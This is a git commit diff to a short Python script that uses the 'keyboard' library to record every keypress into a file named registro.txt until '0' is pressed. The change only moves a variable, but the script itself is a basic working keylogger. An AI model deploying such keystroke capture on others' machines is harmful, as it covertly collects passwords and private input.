a23a8ebc4e34b25d989a7a68a2c02a25d360e63d
asr006 <arirodriguezco@uide.edu.ec>
2026-04-23 15:08:08 -0500

    Update main.py

--- main.py
+++ main.py
@@ -1,10 +1,12 @@
 import keyboard
 
+fin = '0'
+
 def grabar(tecla):
     with open("registro.txt", "a") as f:
         f.write(f"{tecla.name} ")
 
-fin = '0'
+
 
 keyboard.on_press(grabar)
 keyboard.wait(fin)
